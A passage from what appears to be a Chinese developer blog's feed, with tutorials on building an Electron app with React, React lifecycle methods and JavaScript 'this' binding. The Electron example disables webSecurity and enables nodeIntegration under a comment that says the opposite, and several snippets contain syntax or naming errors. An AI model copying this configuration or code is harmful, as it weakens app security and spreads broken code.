      <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Electron可以简单地理解为</span><br><span class="line">Electron = nodejs + chrome内核</span><br></pre></td></tr></table></figure><p>因为内置chrome内核，所以开发者可以用html/css/js来构建页面，这一部分运行在<em>渲染进程</em>中。<br>因为内置nodejs环境，所以可以访问计算机本地的资源：读写磁盘文件、创建进程、本地通知，这一部分运行在<em>主进程</em>中。</p><p><br></p><h3 id="1-搭建应用"><a href="#1-搭建应用" class="headerlink" title="1. 搭建应用"></a>1. 搭建应用</h3><p>目标：搭建一个Electron + create-react-app + dva + react-router + antd的应用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 使用create-react-app脚手架</span><br><span class="line">create-react-app my-app</span><br><span class="line">cd my-app</span><br><span class="line">npm start</span><br><span class="line">npm run eject</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 安装electron</span><br><span class="line">npm install electron --save-dev</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 修改pakcage.json</span><br><span class="line">"main": "public/electron.js",</span><br><span class="line">"homepage": ".",</span><br><span class="line">"scripts": &#123;</span><br><span class="line">  "electron-dev": "ELECTRON_START_URL=http://localhost:3000 electron ."</span><br><span class="line">  "electron": "electron .",</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-添加electron启动文件"><a href="#2-添加electron启动文件" class="headerlink" title="2. 添加electron启动文件"></a>2. 添加electron启动文件</h3><p>创建electron启动文件<code>/public/electron.js</code>，有两点修改：</p><ul><li>定义开发环境下<code>mainWindow.loadURL(&#39;http://localhost:3000&#39;)</code>,发布环境下则加载 <code>build/index.html</code> 文件。</li><li>定义<code>new BrowserWindow</code>的<code>webPreferences</code>属性，指定预加载的js文件(<code>./public/renderer.js</code>)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Modules to control application life and create native browser window</span></span><br><span class="line"><span class="keyword">const</span> &#123;app, BrowserWindow, ipcMain, dialog &#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"><span class="keyword">const</span> pkg = <span class="built_in">require</span>(<span class="string">'./package.json'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Keep a global reference of the window object, if you don't, the window will</span></span><br><span class="line"><span class="comment">// be closed automatically when the JavaScript object is garbage collected.</span></span><br><span class="line"><span class="keyword">let</span> mainWindow</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWindow</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Create the browser window.</span></span><br><span class="line">  mainWindow = <span class="keyword">new</span> BrowserWindow(&#123;</span><br><span class="line">    width: <span class="number">800</span>, </span><br><span class="line">    height: <span class="number">600</span>,</span><br><span class="line">    autoHideMenuBar: <span class="literal">true</span>,</span><br><span class="line">    fullscreenable: <span class="literal">false</span>,</span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">        javascript: <span class="literal">true</span>,</span><br><span class="line">        plugins: <span class="literal">true</span>,</span><br><span class="line">        nodeIntegration: <span class="literal">true</span>, <span class="comment">// 不集成 Nodejs</span></span><br><span class="line">        webSecurity: <span class="literal">false</span>,</span><br><span class="line">        preload: path.join(__dirname, <span class="string">'./public/renderer.js'</span>) </span><br><span class="line">        <span class="comment">// 但预加载的 js 文件内仍可以使用 Nodejs 的 API</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// and load the index.html of the app.</span></span><br><span class="line">  <span class="comment">// 这里要注意一下，这里是让浏览器窗口加载网页。</span></span><br><span class="line">  <span class="comment">// 如果是开发环境，则url为http://localhost:3000（package.json中配置）</span></span><br><span class="line">  <span class="comment">// 如果是生产环境，则url为build/index.html</span></span><br><span class="line">  <span class="keyword">const</span> startUrl = process.env.ELECTRON_START_URL || url.format(&#123;</span><br><span class="line">      pathname: path.join(__dirname, <span class="string">'/../build/index.html'</span>),</span><br><span class="line">      protocol: <span class="string">'file:'</span>,</span><br><span class="line">      slashes: <span class="literal">true</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 加载网页之后，会创建`渲染进程`</span></span><br><span class="line">  mainWindow.loadURL(startUrl);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the DevTools.</span></span><br><span class="line">  mainWindow.webContents.openDevTools()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Emitted when the window is closed.</span></span><br><span class="line">  mainWindow.on(<span class="string">'closed'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Dereference the window object, usually you would store windows</span></span><br><span class="line">    <span class="comment">// in an array if your app supports multi windows, this is the time</span></span><br><span class="line">    <span class="comment">// when you should delete the corresponding element.</span></span><br><span class="line">    mainWindow = <span class="literal">null</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This method will be called when Electron has finished</span></span><br><span class="line"><span class="comment">// initialization and is ready to create browser windows.</span></span><br><span class="line"><span class="comment">// Some APIs can only be used after this event occurs.</span></span><br><span class="line">app.on(<span class="string">'ready'</span>, createWindow)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quit when all windows are closed.</span></span><br><span class="line">app.on(<span class="string">'window-all-closed'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// On OS X it is common for applications and their menu bar</span></span><br><span class="line">  <span class="comment">// to stay active until the user quits explicitly with Cmd + Q</span></span><br><span class="line">  <span class="keyword">if</span> (process.platform !== <span class="string">'darwin'</span>) &#123;</span><br><span class="line">    app.quit()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.on(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// On OS X it's common to re-create a window in the app when the</span></span><br><span class="line">  <span class="comment">// dock icon is clicked and there are no other windows open.</span></span><br><span class="line">  <span class="keyword">if</span> (mainWindow === <span class="literal">null</span>) &#123;</span><br><span class="line">    createWindow()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// In this file you can include the rest of your app's specific main process</span></span><br><span class="line"><span class="comment">// code. You can also put them in separate files and require them here.</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-调试运行"><a href="#3-调试运行" class="headerlink" title="3. 调试运行"></a>3. 调试运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 本地运行，运行electron，</span><br><span class="line">npm run start</span><br><span class="line">npm run electron-dev</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 生产环境运行</span><br><span class="line">npm run build</span><br><span class="line">npm run electron</span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-在React-App里调用electron-API"><a href="#4-在React-App里调用electron-API" class="headerlink" title="4. 在React App里调用electron API"></a>4. 在React App里调用electron API</h3><p>所有Electron的API都会被指派给一种进程类型。许多API只能被用于主进程或渲染进程，但有一些可以同时在上述两种进程中使用。</p><ul><li><p>新建 <code>/public/renderer.js</code> 文件，该文件在electron入口文件里定义为预加载文件。通过require的方式获取electron及其他API，暴露electron API</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> electron = <span class="built_in">require</span>(<span class="string">'electron'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三方Electron api</span></span><br><span class="line"><span class="keyword">var</span> ZegoLiveRoom = <span class="built_in">require</span>(<span class="string">"zegoliveroom/ZegoLiveRoom.js"</span>);</span><br><span class="line"><span class="keyword">var</span> ZEGOCONSTANTS = <span class="built_in">require</span>(<span class="string">"zegoliveroom/ZegoConstant.js"</span>);</span><br><span class="line"><span class="keyword">var</span> zegoClient = <span class="keyword">new</span> ZegoLiveRoom();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  zegoClient.initSDK(config)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">global.zego = &#123;</span><br><span class="line">  init,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在React中调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/App.js</span></span><br><span class="line"><span class="keyword">const</span> electron = <span class="built_in">window</span>.electron;</span><br><span class="line"><span class="keyword">const</span> zego = <span class="built_in">window</span>.zego;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span>()</span>&#123;</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    zego.init()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> &lt;div&gt;hell&lt;/div&gt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-生成-exe"><a href="#5-生成-exe" class="headerlink" title="5. 生成.exe"></a>5. 生成.exe</h3><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.jianshu.com/p/5e41663825c6" target="_blank" rel="noopener">使用create-react-app编写Electron app</a></li><li><a href="https://www.jianshu.com/p/96327b044e85" target="_blank" rel="noopener">Electron 无边框窗口的拖动</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React Virtual Dom</title>
      <link href="/2019/08/01/React-Virtual-Dom/"/>
      <url>/2019/08/01/React-Virtual-Dom/</url>
      <content type="html"><![CDATA[<blockquote><p>你告诉React希望让UI是什么状态，React就确保DOM匹配该状态。这使你可以从属性操作、事件处理和手动DOM更新这些操作中解放出来。</p></blockquote>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React生命周期</title>
      <link href="/2019/07/31/React%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
      <url>/2019/07/31/React%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</url>
      <content type="html"><![CDATA[<blockquote><p>生命周期，hook函数，允许你在特定阶段执行一些方法的函数。</p></blockquote><p><br></p><h3 id="1-什么时候开始调用"><a href="#1-什么时候开始调用" class="headerlink" title="1. 什么时候开始调用?"></a>1. 什么时候开始调用?</h3><p>有状态组件，定义组件时并不会触发任何的生命周期函数，真正的生命周期开始于组件被渲染至页面中。无状态组件(纯函数)，因为没有继承<code>React.Component</code>，所以无法获得各种生命周期函数，也无法访问state，但能访问作为参数传入的props。</p><p><em>Question</em><br>当MyComponent组件渲染到页面上时，MyButton组件的生命周期函数会开始调用吗？</p><p><em>Answer</em><br><code>&lt;MyButton /&gt;</code>语法，是JSX语法，实际是转化为<code>React.createElement(MyButton, null)</code>的函数调用，返回一个React元素，也就是一个虚拟DOM节点（DOM节点的描述）s，实际是一个纯粹的object对象，基本由key, props, ref, type组成。当我们把React元素传递给<code>ReactDOM.render</code>方法，并告诉它在页面上渲染的位置，它才会给我们返回组件的实例(instance)。仅仅生成一个React元素是不会触发声明周期函数调用的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> MyButton <span class="keyword">from</span> <span class="string">'./Button'</span>;</span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyComponent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="comment">// &lt;MyButton&gt;的生命周期函数会开始调用吗？</span></span><br><span class="line">    <span class="keyword">const</span> button = <span class="xml"><span class="tag">&lt;<span class="name">MyButton</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    return <span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line">ReactDOM.render(&lt;MyComponent&gt;, document.getElementById('app'))</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-三个阶段"><a href="#2-三个阶段" class="headerlink" title="2. 三个阶段"></a>2. 三个阶段</h3><h4 id="2-1-挂载"><a href="#2-1-挂载" class="headerlink" title="2.1 挂载"></a>2.1 挂载</h4><p>当组件实例被创建并插入DOM中时，其生命周期调用顺序如下</p><ul><li>constructor</li><li>getDerivedStateFromProps</li><li>render</li><li>componentDidMount</li></ul><p><br></p><h4 id="2-2-更新"><a href="#2-2-更新" class="headerlink" title="2.2 更新"></a>2.2 更新</h4><p>当组件的props或state发生变化时会触发更新。组件更新的生命周期调用顺序如下</p><ul><li>getDerivedStateFromProps </li><li>shouldComponentUpdate </li><li>render </li><li>getSnapshotBeforeUpdate </li><li>componentDidUpdate</li></ul><p><br></p><h4 id="2-3-卸载"><a href="#2-3-卸载" class="headerlink" title="2.3 卸载"></a>2.3 卸载</h4><p>当组件从DOM中移除之前，会调用</p><ul><li>compoenntWillMount</li></ul><p><br><br><img src="/2019/07/31/React生命周期/1.png"></p><p><br></p><h3 id="3-生命周期函数"><a href="#3-生命周期函数" class="headerlink" title="3. 生命周期函数"></a>3. 生命周期函数</h3><h4 id="3-1-constructor"><a href="#3-1-constructor" class="headerlink" title="3.1 constructor"></a>3.1 constructor</h4><p>在React中，构造函数仅用于：</p><ul><li>通过给<code>this.state</code>赋值对象来初始化内部state（避免将props的值赋值给state）</li><li>为事件处理函数绑定实例</li></ul><p><br></p><h4 id="3-2-getDerivedStateFromProps"><a href="#3-2-getDerivedStateFromProps" class="headerlink" title="3.2 getDerivedStateFromProps"></a>3.2 getDerivedStateFromProps</h4><p>会在调用render方法之前调用，它会返回一个对象来更新state，如果返回null则不更新任何内容。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> getDerivedStateFromProps(props, state)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-3-render"><a href="#3-3-render" class="headerlink" title="3.3 render"></a>3.3 render</h4><p><br></p><h4 id="3-4-componentDidMount"><a href="#3-4-componentDidMount" class="headerlink" title="3.4 componentDidMount"></a>3.4 componentDidMount</h4><p><code>componentDidMount</code>会在组件挂载后(插入DOM树中)立即调用。</p><p>当这个函数被调用时，就意味着可以访问组件的原生DOM。此时不仅能访问当前组件的原生DOM，还能访问当前组件子组件的原生DOM。网络请求获取数据，依赖于DOM节点的第三方插件初始化，应在这里执行。</p><p><img src="/2019/07/31/React生命周期/3.png"><br><br><br><code>componentWillMount</code>和<code>render</code>的调用顺序是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A -&gt; A.0 -&gt; A.0.0 -&gt; A.0.1 -&gt; A.1 -&gt; A.2.</span><br></pre></td></tr></table></figure></p><p><code>componentDidMount</code>的调用顺序是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A.2 -&gt; A.1 -&gt; A.0.1 -&gt; A.0.0 -&gt; A.0 -&gt; A</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-5-shouldComponentUpdate"><a href="#3-5-shouldComponentUpdate" class="headerlink" title="3.5 shouldComponentUpdate"></a>3.5 shouldComponentUpdate</h4><p>可以将<code>this.props</code>与<code>nextProps</code>，以及<code>this.state</code>与<code>nextState</code>进行比较，并返回false以告知React可以跳过更新，默认为true。</p><p>不要企图依靠此方法来阻止渲染，因为这可能产生bug。你应该考虑使用内置的<code>PureComponent</code>组件, 来减少不必要的更新。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shouldComponentUpdate(nextProps, nextState)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-6-componentWillUnmount"><a href="#3-6-componentWillUnmount" class="headerlink" title="3.6 componentWillUnmount"></a>3.6 componentWillUnmount</h4><p>当组件从DOM中移除之前，会调用<code>compoenntWillMount</code>。在此方法中执行必要的清理操作，例如，清除 timer，取消网络请求或清除在 componentDidMount() 中创建的订阅等。</p><p><br></p><h3 id="5-其他"><a href="#5-其他" class="headerlink" title="5. 其他"></a>5. 其他</h3><h4 id="5-1-this-setState"><a href="#5-1-this-setState" class="headerlink" title="5.1 this.setState"></a>5.1 this.setState</h4><p><br></p><h4 id="5-2-this-forceUpdate"><a href="#5-2-this-forceUpdate" class="headerlink" title="5.2 this.forceUpdate"></a>5.2 this.forceUpdate</h4><p>默认情况下，当组件的state或props发生变化时，组件将重新渲染。如果render()方法依赖于其他数据，则可以调用forceUpdate()强制让组件重新渲染。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.forceUpdate(callback)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-Component-defaultProps"><a href="#5-3-Component-defaultProps" class="headerlink" title="5.3 Component.defaultProps"></a>5.3 Component.defaultProps</h4><p><code>defaultProps</code>可以为Class组件添加默认props。用于props未赋值，但又不能为null的情况。</p><p>constructor的下一生命周期，是getDefaultProps 和 getInitialState，这两个函数只在es5语法中才暴露出来，在es6中通过两个赋值函数实现了同样的效果。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="comment">// es6中的 this.state = &#123;&#125; 相当于es5中的 getInitialState</span></span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      counts: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;this.props.name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6中的 defaultProps 相当于 es5中的 getDefaultProps</span></span><br><span class="line">App.defaultProps = &#123; <span class="attr">name</span>: <span class="string">'default'</span> &#125;</span><br></pre></td></tr></table></figure></p><p><em>Question</em><br>设置了<code>App.defaultProps = { name: &#39;default&#39; }</code>后, <code>&lt;App name={null} /&gt;</code> 和 <code>&lt;App name={undefined} /&gt;</code>两种状况下，this.props.name的输出值是多少？</p><p><em>Answer</em><br>1.null  2. default</p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://react.docschina.org/docs/react-component.html" target="_blank" rel="noopener">React.Component</a></li><li><a href="http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/" target="_blank" rel="noopener">生命周期图谱</a></li><li><a href="https://zhuanlan.zhihu.com/p/30757059" target="_blank" rel="noopener">深入React的生命周期(上)：出生阶段(Mount)</a></li><li><a href="https://zhuanlan.zhihu.com/p/30971608" target="_blank" rel="noopener">深入React的生命周期(下)：更新(Update)</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS中的this</title>
      <link href="/2019/07/29/JS-this/"/>
      <url>/2019/07/29/JS-this/</url>
      <content type="html"><![CDATA[<blockquote><p><em><code>this</code></em>本身是一个指针，指向调用函数的对象。如何准确判断<em><code>this</code></em>指向的是什么？<br>你需要了解<em><code>this</code></em>的绑定规则 —— 默认绑定，隐式绑定，硬绑定， new绑定。 </p></blockquote><p><br></p><h3 id="1-默认绑定"><a href="#1-默认绑定" class="headerlink" title="1. 默认绑定"></a>1. 默认绑定</h3><p>默认绑定，在不能应用其他绑定规则时使用的默认规则，通常是独立函数调用。</p><p>在调用<code>sayHi()</code>时，应用了默认绑定，<code>this</code>指向全局对象（非严格模式下），严格模式下，<code>this</code>指向undefined, undefined上没有this对象，会抛出错误。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Amy'</span></span><br><span class="line">sayHi();  <span class="comment">// 浏览器下 hello,Amy</span></span><br><span class="line"><span class="comment">// node环境下 hello,undefined。因为node中name并不是挂在全局对象上的</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-隐式绑定"><a href="#2-隐式绑定" class="headerlink" title="2. 隐式绑定"></a>2. 隐式绑定</h3><p>函数的调用是在某个对象上触发的，典型形式为<em><code>XXX.fun()</code></em>， 调用位置上存在上下文对象。</p><p>sayHi函数声明在外部，严格来说不属于person， 但在调用sayHi时，调用位置会使用person的上下文来引用函数，隐式绑定会把函数调用中的this绑定到这个上下文对象。（注意，不管有多少层调用，只有最后一层会确定this指向的是什么）<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  name: <span class="string">'Sarah'</span>,</span><br><span class="line">  friend: person2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span></span><br><span class="line">person1.friend.sayHi()  <span class="comment">// Hi,Amy</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-1-隐式绑定丢失"><a href="#2-1-隐式绑定丢失" class="headerlink" title="2.1 隐式绑定丢失"></a>2.1 隐式绑定丢失</h4><p>Hi直接指向了sayHi的引用，在调用的时候，跟person没有关系。<em><code>XXX.fn()</code></em>如果<code>fn()</code>前什么都没有，那肯定不是隐式绑定，但也不一定就是默认绑定。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = person.sayHi;</span><br><span class="line">Hi();   <span class="comment">// Hello,Mike</span></span><br></pre></td></tr></table></figure></p><p>在<strong>回调函数</strong>中，也会存在隐式绑定丢失。</p><ul><li>第一条输出中，<code>setTimeout</code>的回调函数中，this使用的是默认绑定，非严格模式下，this指向全局对象</li><li>第二条输出中，<code>setTimeout(fn, delay){ fn() }</code>，相当于将<code>person2.sayHi</code>赋值给了一个变量，最后执行了这个变量，因此sayHi中的this和person2就没有关系了。</li><li>第三条输出中，执行的是<code>person2.sayHi()</code>，所以this指向person2。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span 